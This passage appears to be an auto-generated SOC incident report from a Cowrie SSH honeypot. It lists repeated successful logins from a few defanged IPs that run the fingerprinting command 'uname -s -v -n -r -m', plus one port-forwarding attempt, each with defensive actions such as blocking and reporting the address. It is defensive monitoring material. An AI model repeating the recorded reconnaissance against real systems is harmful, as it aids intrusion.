| `2026-07-28 04:58:58` | `cowrie.command.input` |
| `2026-07-28 04:58:58` | `cowrie.log.closed` |
| `2026-07-28 04:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd2de87b187

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:00` | `cowrie.session.connect` |
| `2026-07-28 04:59:01` | `cowrie.client.version` |
| `2026-07-28 04:59:01` | `cowrie.client.kex` |
| `2026-07-28 04:59:03` | `cowrie.login.success` |
| `2026-07-28 04:59:05` | `cowrie.session.params` |
| `2026-07-28 04:59:05` | `cowrie.command.input` |
| `2026-07-28 04:59:06` | `cowrie.log.closed` |
| `2026-07-28 04:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e96504cf88

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:06` | `cowrie.session.connect` |
| `2026-07-28 04:59:07` | `cowrie.client.version` |
| `2026-07-28 04:59:07` | `cowrie.client.kex` |
| `2026-07-28 04:59:09` | `cowrie.login.success` |
| `2026-07-28 04:59:11` | `cowrie.session.params` |
| `2026-07-28 04:59:11` | `cowrie.command.input` |
| `2026-07-28 04:59:11` | `cowrie.log.closed` |
| `2026-07-28 04:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2764bf24b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:12` | `cowrie.session.connect` |
| `2026-07-28 04:59:12` | `cowrie.client.version` |
| `2026-07-28 04:59:12` | `cowrie.client.kex` |
| `2026-07-28 04:59:16` | `cowrie.login.success` |
| `2026-07-28 04:59:19` | `cowrie.session.params` |
| `2026-07-28 04:59:19` | `cowrie.command.input` |
| `2026-07-28 04:59:20` | `cowrie.log.closed` |
| `2026-07-28 04:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b2ee83057d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:18` | `cowrie.session.connect` |
| `2026-07-28 04:59:19` | `cowrie.client.version` |
| `2026-07-28 04:59:19` | `cowrie.client.kex` |
| `2026-07-28 04:59:22` | `cowrie.login.success` |
| `2026-07-28 04:59:24` | `cowrie.session.params` |
| `2026-07-28 04:59:24` | `cowrie.command.input` |
| `2026-07-28 04:59:24` | `cowrie.log.closed` |
| `2026-07-28 04:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397a726fb494

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:25` | `cowrie.session.connect` |
| `2026-07-28 04:59:26` | `cowrie.client.version` |
| `2026-07-28 04:59:26` | `cowrie.client.kex` |
| `2026-07-28 04:59:27` | `cowrie.login.success` |
| `2026-07-28 04:59:28` | `cowrie.session.params` |
| `2026-07-28 04:59:28` | `cowrie.command.input` |
| `2026-07-28 04:59:28` | `cowrie.log.closed` |
| `2026-07-28 04:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ec56672336

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:32` | `cowrie.session.connect` |
| `2026-07-28 04:59:32` | `cowrie.client.version` |
| `2026-07-28 04:59:32` | `cowrie.client.kex` |
| `2026-07-28 04:59:33` | `cowrie.login.success` |
| `2026-07-28 04:59:33` | `cowrie.session.params` |
| `2026-07-28 04:59:33` | `cowrie.command.input` |
| `2026-07-28 04:59:34` | `cowrie.log.closed` |
| `2026-07-28 04:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5894fe0116d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:38` | `cowrie.session.connect` |
| `2026-07-28 04:59:38` | `cowrie.client.version` |
| `2026-07-28 04:59:38` | `cowrie.client.kex` |
| `2026-07-28 04:59:39` | `cowrie.login.success` |
| `2026-07-28 04:59:40` | `cowrie.session.params` |
| `2026-07-28 04:59:40` | `cowrie.command.input` |
| `2026-07-28 04:59:41` | `cowrie.log.closed` |
| `2026-07-28 04:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf9e8f1114e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:44` | `cowrie.session.connect` |
| `2026-07-28 04:59:45` | `cowrie.client.version` |
| `2026-07-28 04:59:45` | `cowrie.client.kex` |
| `2026-07-28 04:59:45` | `cowrie.login.success` |
| `2026-07-28 04:59:47` | `cowrie.session.params` |
| `2026-07-28 04:59:47` | `cowrie.command.input` |
| `2026-07-28 04:59:47` | `cowrie.log.closed` |
| `2026-07-28 04:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68dfe2fceee7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 04:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:50` | `cowrie.session.connect` |
| `2026-07-28 04:59:50` | `cowrie.client.version` |
| `2026-07-28 04:59:50` | `cowrie.client.kex` |
| `2026-07-28 04:59:53` | `cowrie.login.success` |
| `2026-07-28 04:59:54` | `cowrie.session.params` |
| `2026-07-28 04:59:54` | `cowrie.command.input` |
| `2026-07-28 04:59:55` | `cowrie.log.closed` |
| `2026-07-28 04:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4564671c7575

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:59 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:59:56` | `cowrie.session.connect` |
| `2026-07-28 04:59:57` | `cowrie.client.version` |
| `2026-07-28 04:59:57` | `cowrie.client.kex` |
| `2026-07-28 04:59:59` | `cowrie.login.success` |
| `2026-07-28 05:00:01` | `cowrie.session.params` |
| `2026-07-28 05:00:01` | `cowrie.command.input` |
| `2026-07-28 05:00:01` | `cowrie.log.closed` |
| `2026-07-28 05:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebec56b840b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:02` | `cowrie.session.connect` |
| `2026-07-28 05:00:03` | `cowrie.client.version` |
| `2026-07-28 05:00:03` | `cowrie.client.kex` |
| `2026-07-28 05:00:05` | `cowrie.login.success` |
| `2026-07-28 05:00:07` | `cowrie.session.params` |
| `2026-07-28 05:00:07` | `cowrie.command.input` |
| `2026-07-28 05:00:07` | `cowrie.log.closed` |
| `2026-07-28 05:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c7a63ceab1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:09` | `cowrie.session.connect` |
| `2026-07-28 05:00:09` | `cowrie.client.version` |
| `2026-07-28 05:00:10` | `cowrie.client.kex` |
| `2026-07-28 05:00:10` | `cowrie.login.success` |
| `2026-07-28 05:00:11` | `cowrie.session.params` |
| `2026-07-28 05:00:11` | `cowrie.command.input` |
| `2026-07-28 05:00:11` | `cowrie.log.closed` |
| `2026-07-28 05:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e3af6ca560

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:16` | `cowrie.session.connect` |
| `2026-07-28 05:00:16` | `cowrie.client.version` |
| `2026-07-28 05:00:16` | `cowrie.client.kex` |
| `2026-07-28 05:00:17` | `cowrie.login.success` |
| `2026-07-28 05:00:18` | `cowrie.session.params` |
| `2026-07-28 05:00:18` | `cowrie.command.input` |
| `2026-07-28 05:00:18` | `cowrie.log.closed` |
| `2026-07-28 05:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4184756413a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:21` | `cowrie.session.connect` |
| `2026-07-28 05:00:22` | `cowrie.client.version` |
| `2026-07-28 05:00:22` | `cowrie.client.kex` |
| `2026-07-28 05:00:23` | `cowrie.login.success` |
| `2026-07-28 05:00:25` | `cowrie.session.params` |
| `2026-07-28 05:00:25` | `cowrie.command.input` |
| `2026-07-28 05:00:25` | `cowrie.log.closed` |
| `2026-07-28 05:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7185c848538

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:27` | `cowrie.session.connect` |
| `2026-07-28 05:00:27` | `cowrie.client.version` |
| `2026-07-28 05:00:27` | `cowrie.client.kex` |
| `2026-07-28 05:00:30` | `cowrie.login.success` |
| `2026-07-28 05:00:32` | `cowrie.session.params` |
| `2026-07-28 05:00:32` | `cowrie.command.input` |
| `2026-07-28 05:00:33` | `cowrie.log.closed` |
| `2026-07-28 05:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5140e8a75128

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:33` | `cowrie.session.connect` |
| `2026-07-28 05:00:33` | `cowrie.client.version` |
| `2026-07-28 05:00:33` | `cowrie.client.kex` |
| `2026-07-28 05:00:37` | `cowrie.login.success` |
| `2026-07-28 05:00:39` | `cowrie.session.params` |
| `2026-07-28 05:00:39` | `cowrie.command.input` |
| `2026-07-28 05:00:40` | `cowrie.log.closed` |
| `2026-07-28 05:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5546a9eb6ffe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:39` | `cowrie.session.connect` |
| `2026-07-28 05:00:40` | `cowrie.client.version` |
| `2026-07-28 05:00:40` | `cowrie.client.kex` |
| `2026-07-28 05:00:43` | `cowrie.login.success` |
| `2026-07-28 05:00:45` | `cowrie.session.params` |
| `2026-07-28 05:00:45` | `cowrie.command.input` |
| `2026-07-28 05:00:46` | `cowrie.log.closed` |
| `2026-07-28 05:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2453f33c73be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:45` | `cowrie.session.connect` |
| `2026-07-28 05:00:46` | `cowrie.client.version` |
| `2026-07-28 05:00:46` | `cowrie.client.kex` |
| `2026-07-28 05:00:49` | `cowrie.login.success` |
| `2026-07-28 05:00:52` | `cowrie.session.params` |
| `2026-07-28 05:00:52` | `cowrie.command.input` |
| `2026-07-28 05:00:53` | `cowrie.log.closed` |
| `2026-07-28 05:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dee8385a2ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:51` | `cowrie.session.connect` |
| `2026-07-28 05:00:52` | `cowrie.client.version` |
| `2026-07-28 05:00:52` | `cowrie.client.kex` |
| `2026-07-28 05:00:57` | `cowrie.login.success` |
| `2026-07-28 05:01:00` | `cowrie.session.params` |
| `2026-07-28 05:01:00` | `cowrie.command.input` |
| `2026-07-28 05:01:01` | `cowrie.log.closed` |
| `2026-07-28 05:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021066b80227

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:00 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:00:57` | `cowrie.session.connect` |
| `2026-07-28 05:00:58` | `cowrie.client.version` |
| `2026-07-28 05:00:58` | `cowrie.client.kex` |
| `2026-07-28 05:01:04` | `cowrie.login.success` |
| `2026-07-28 05:01:07` | `cowrie.session.params` |
| `2026-07-28 05:01:07` | `cowrie.command.input` |
| `2026-07-28 05:01:08` | `cowrie.log.closed` |
| `2026-07-28 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22d0842b6ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:03` | `cowrie.session.connect` |
| `2026-07-28 05:01:04` | `cowrie.client.version` |
| `2026-07-28 05:01:04` | `cowrie.client.kex` |
| `2026-07-28 05:01:10` | `cowrie.login.success` |
| `2026-07-28 05:01:13` | `cowrie.session.params` |
| `2026-07-28 05:01:13` | `cowrie.command.input` |
| `2026-07-28 05:01:14` | `cowrie.log.closed` |
| `2026-07-28 05:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1ebae62da9

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:09` | `cowrie.session.connect` |
| `2026-07-28 05:01:10` | `cowrie.client.version` |
| `2026-07-28 05:01:10` | `cowrie.client.kex` |
| `2026-07-28 05:01:14` | `cowrie.login.success` |
| `2026-07-28 05:01:14` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e01e74c572b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:10` | `cowrie.session.connect` |
| `2026-07-28 05:01:11` | `cowrie.client.version` |
| `2026-07-28 05:01:11` | `cowrie.client.kex` |
| `2026-07-28 05:01:17` | `cowrie.login.success` |
| `2026-07-28 05:01:20` | `cowrie.session.params` |
| `2026-07-28 05:01:20` | `cowrie.command.input` |
| `2026-07-28 05:01:21` | `cowrie.log.closed` |
| `2026-07-28 05:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a5e44d32723

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:15` | `cowrie.session.connect` |
| `2026-07-28 05:01:17` | `cowrie.client.version` |
| `2026-07-28 05:01:17` | `cowrie.client.kex` |
| `2026-07-28 05:01:22` | `cowrie.login.success` |
| `2026-07-28 05:01:26` | `cowrie.session.params` |
| `2026-07-28 05:01:26` | `cowrie.command.input` |
| `2026-07-28 05:01:27` | `cowrie.log.closed` |
| `2026-07-28 05:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2db303e7f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:01:21` | `cowrie.session.connect` |
| `2026-07-28 05:01:22` | `cowrie.client.version` |
| `2026-07-28 05:01:22` | `cowrie.client.kex` |
| `2026-07-28 05:01:28` | `cowrie.login.success` |
| `2026-07-28 05:01:30` | `cowrie.session.params` |
| `2026-07-28 05:01:30` | `cowrie.command.input` |
| `2026-07-28 05:01:32` | `cowrie.log.closed` |
| `2026-07-28 05:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8680c15c317

| Field | Detail |
|---|---|
| **Source IP** | `117.223.152[.]69` |
| **First Seen** | 2026-07-28 05:01 |
| **Last Seen** | 2026-07-28 05:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
